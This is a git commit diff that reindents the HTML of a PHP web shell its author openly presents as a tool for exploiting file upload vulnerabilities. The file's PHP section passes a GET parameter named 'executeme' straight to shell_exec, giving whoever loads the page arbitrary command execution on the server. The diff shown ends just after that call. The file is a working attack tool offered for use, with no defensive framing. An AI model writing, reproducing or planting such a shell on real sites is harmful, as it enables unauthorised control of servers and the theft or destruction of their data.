7e7fb88c7b71ae549cb0a5e478fe7eaaa91a034c
Mr MJT [Mahdi Jaber] <87242348+Mr6MJT@users.noreply.github.com>
2022-02-07 19:15:59 +0200

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,11 +1,12 @@
 <html>
-<body>
-<form method="GET">
-<center><h1 > This webshell coded By Mahdi Jaber :) <a href="https://github.com/Mr6MJT">ClickHere</a> to visit my GitHub account.</h1>
-<h1> By this webshell you can exploit fileupload vulnerability</h1></center>
-<input type="text" name="executeme" placeholder="Enter command" style="width: 100%"> <input type="submit" value="Execute"> </form> 
-</body>
+    <body>
+        <form method="GET">
+        <center><h1 > This webshell coded By Mahdi Jaber :) <a href="https://github.com/Mr6MJT">ClickHere</a> to visit my GitHub account.</h1>
+        <h1> By this webshell you can exploit fileupload vulnerability</h1></center>
+        <input type="text" name="executeme" placeholder="Enter command" style="width: 100%"> <input type="submit" value="Execute"> </form> 
+    </body>
 </html>
+
 <?php
     $execute = $_GET["executeme"];
     $output = shell_exec($execute);
